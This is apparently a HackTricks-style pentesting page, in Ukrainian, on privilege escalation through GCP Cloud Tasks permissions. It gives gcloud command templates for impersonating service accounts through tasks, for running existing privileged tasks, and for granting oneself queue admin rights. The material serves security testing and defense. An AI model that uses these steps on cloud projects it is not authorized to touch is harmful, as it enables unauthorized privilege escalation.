# GCP - Cloud Tasks Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Tasks

### `cloudtasks.tasks.create`, `iam.serviceAccounts.actAs`

Атакуючий з цими дозволами може **виконувати дії від імені інших сервісних облікових записів**, створюючи завдання, які виконуються з ідентичністю вказаного сервісного облікового запису. Це дозволяє надсилати **автентифіковані HTTP-запити до сервісів Cloud Run або Cloud Functions, захищених IAM**.

<details><summary>Створити Cloud Task з виконанням від імені сервісного облікового запису</summary>
```bash
gcloud tasks create-http-task \
task-$(date '+%Y%m%d%H%M%S') \
--location us-central1 \
--queue <queue_name> \
--url 'https://<service_name>.us-central1.run.app' \
--method POST \
--header 'X-Hello: world' \
--body-content '{"hello":"world"}' \
--oidc-service-account-email <account>@<project_id>.iam.gserviceaccount.com
```
</details>

### `cloudtasks.tasks.run`, `cloudtasks.tasks.list`

Зловмисник із такими дозволами може **запускати існуючі заплановані завдання** без наявності прав на сервісний акаунт, пов'язаний із завданням. Це дозволяє виконувати завдання, які раніше були створені з використанням сервісних акаунтів з вищими привілеями.

<details><summary>Запустити існуюче Cloud Task без дозволу actAs</summary>
```bash
gcloud tasks run projects/<project_id>/locations/us-central1/queues/<queue_name>/tasks/<task_id>
```
</details>

Принципал, який виконує цю команду, **не потребує дозволу `iam.serviceAccounts.actAs`** на service account задачі. Однак це лише дозволяє запускати існуючі tasks — не надає можливості створювати або змінювати їх.

### `cloudtasks.queues.setIamPolicy`

Атакуючий із цим дозволом може **надати собі або іншим принципалам ролі Cloud Tasks** на конкретних чергах, потенційно підвищивши привілеї до `roles/cloudtasks.admin`, що включає можливість створювати і запускати tasks.

<details><summary>Grant Cloud Tasks admin role on queue</summary>
```bash
gcloud tasks queues add-iam-policy-binding \
<queue_name> \
--location us-central1 \
--member serviceAccount:<account>@<project_id>.iam.gserviceaccount.com \
--role roles/cloudtasks.admin
```
</details>

Це дозволяє зловмиснику надати повні права адміністратора Cloud Tasks на чергу будь-якому service account, що перебуває під його контролем.

## Посилання

- [Google Cloud Tasks Documentation](https://cloud.google.com/tasks/docs)

{{#include ../../../banners/hacktricks-training.md}}
